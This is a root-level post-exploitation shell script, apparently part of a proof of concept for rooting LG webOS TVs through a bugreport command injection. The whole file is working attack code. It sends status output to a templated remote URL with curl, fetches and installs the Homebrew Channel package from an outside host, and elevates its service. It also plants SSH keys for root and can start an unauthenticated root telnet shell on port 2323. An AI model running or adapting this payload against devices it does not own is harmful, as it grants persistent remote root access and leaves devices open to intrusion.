#!/bin/sh
# Post-exploitation script. Runs as root through the bugreport injection.
# Placeholders are substituted by poc.py before the script is served.

RESULT="{{RESULT_URL}}"
HB_IPK="{{HB_IPK_URL}}"
TELNET="{{TELNET}}"
HB_DIR=/media/developer/apps/usr/palm/applications/org.webosbrew.hbchannel
HB_SVC=/media/developer/apps/usr/palm/services/org.webosbrew.hbchannel.service

report() {
  printf '%s\n' "$1" | /usr/bin/curl -s -d@- "$RESULT" >/dev/null 2>&1
}

report "start: $(id 2>&1)"

# 1. Allow developer apps to be installed.
mkdir -p /var/luna/preferences/devmode_enabled 2>/dev/null
report "devmode_enabled: $([ -d /var/luna/preferences/devmode_enabled ] && echo ok || echo failed)"

# 2. Restart appinstalld so it notices the flag.
restart appinstalld >/dev/null 2>&1 || killall appinstalld >/dev/null 2>&1 || true
sleep 3
report "appinstalld restarted"

# 3. Fetch Homebrew Channel IPK from the harness.
if [ -n "$HB_IPK" ]; then
  /usr/bin/curl -s -o /tmp/hbchannel.ipk "$HB_IPK" 2>/dev/null
  size=$(wc -c </tmp/hbchannel.ipk 2>/dev/null)
  report "ipk bytes: ${size:-0}"
fi

# 4. Install it through the dev install path.
if [ -s /tmp/hbchannel.ipk ]; then
  reply=$(/usr/bin/luna-send -n 1 -w 30000 -f luna://com.webos.appInstallService/dev/install \
    '{"id":"com.ares.defaultName","ipkUrl":"/tmp/hbchannel.ipk","subscribe":true}' 2>&1)
  report "install reply: $reply"
  sleep 8
  report "hb app present: $([ -d "$HB_DIR" ] && echo yes || echo no)"
fi

# 5. Elevate the Homebrew service.
if [ -x "$HB_SVC/elevate-service" ]; then
  "$HB_SVC/elevate-service" >/tmp/elevate.log 2>&1
  report "elevate: $?"
else
  report "elevate: missing"
fi

# 6. Optional SSH keys, key-only dropbear.
mkdir -p /home/root/.ssh 2>/dev/null
chmod 700 /home/root/.ssh 2>/dev/null
add_key() {
  [ -n "$1" ] || return 0
  grep -qF "$1" /home/root/.ssh/authorized_keys 2>/dev/null || echo "$1" >> /home/root/.ssh/authorized_keys
}
{{SSH_KEYS}}
chmod 600 /home/root/.ssh/authorized_keys 2>/dev/null
mkdir -p /var/lib/webosbrew/sshd 2>/dev/null
chmod 700 /var/lib/webosbrew/sshd 2>/dev/null
if [ -x "$HB_SVC/bin/dropbear" ] && ! netstat -ltn 2>/dev/null | grep -qE '[:.]22[[:space:]]'; then
  "$HB_SVC/bin/dropbear" -R -p 22 -s 2>/dev/null
  report "sshd started"
fi

# 7. Optional unauthenticated root telnet on 2323.
if [ "$TELNET" = "1" ]; then
  /bin/busybox telnetd -l /bin/sh -p 2323 2>/dev/null
  report "telnetd started"
fi

# 8. Root status from Homebrew Channel.
if [ -f /usr/bin/luna-send ] && [ -d "$HB_SVC" ]; then
  conf=$(/usr/bin/luna-send -n 1 -w 8000 -f luna://org.webosbrew.hbchannel.service/getConfiguration '{}' 2>&1)
  report "hb config: $conf"
fi

report "ROOT_DONE"
